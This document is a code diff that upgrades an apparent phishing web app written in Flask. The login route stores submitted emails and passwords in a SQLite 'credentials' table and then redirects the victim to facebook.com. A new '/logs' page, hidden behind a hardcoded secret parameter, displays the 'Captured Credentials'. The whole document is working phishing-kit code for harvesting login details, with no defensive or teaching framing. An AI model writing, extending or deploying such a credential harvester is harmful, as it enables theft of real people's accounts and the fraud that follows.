@@ -1,8 +1,22 @@
 from flask import Flask, request, render_template_string, redirect
-import csv
-import os
+import sqlite3
+from datetime import datetime
 
 app = Flask(__name__)
+
+# Initialize database
+def init_db():
+    conn = sqlite3.connect('credentials.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS credentials
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  email TEXT,
+                  password TEXT,
+                  timestamp DATETIME)''')
+    conn.commit()
+    conn.close()
+
+init_db()
 
 html_content = """
 <!DOCTYPE html>
@@ -36,7 +50,7 @@ html_content = """
             margin-bottom: 20px;
         }
         input {
-            width: 100%;
+            width: 90%;
             padding: 10px;
             margin: 10px 0;
             border: 1px solid #ccc;
@@ -85,6 +99,42 @@ html_content = """
 </html>
 """
 
+
+logs_template = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Captured Credentials</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        tr:nth-child(even) { background-color: #f9f9f9; }
+    </style>
+</head>
+<body>
+    <h1>Captured Credentials</h1>
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Timestamp</th>
+        </tr>
+        {% for entry in entries %}
+        <tr>
+            <td>{{ entry[0] }}</td>
+            <td>{{ entry[1] }}</td>
+            <td>{{ entry[2] }}</td>
+            <td>{{ entry[3] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
+"""
+
 @app.route('/')
 def index():
     return render_template_string(html_content)
@@ -93,10 +143,30 @@ def index():
 def login():
     email = request.form.get('email')
     password = request.form.get('password')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    print(f"{email}: {password}")
-    
+    conn = sqlite3.connect('credentials.db')
+    c = conn.cursor()
+    c.execute("INSERT INTO credentials (email, password, timestamp) VALUES (?, ?, ?)",
+              (email, password, timestamp))
+    conn.commit()
+    conn.close()
+
     return redirect("https://www.facebook.com")
+
+@app.route('/logs')
+def show_logs():
+    # Simple secret key verification
+    if request.args.get('secret') != 'supersecret':
+        return "Not Found", 404
+    
+    conn = sqlite3.connect('credentials.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
+    entries = c.fetchall()
+    conn.close()
+    
+    return render_template_string(logs_template, entries=entries)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
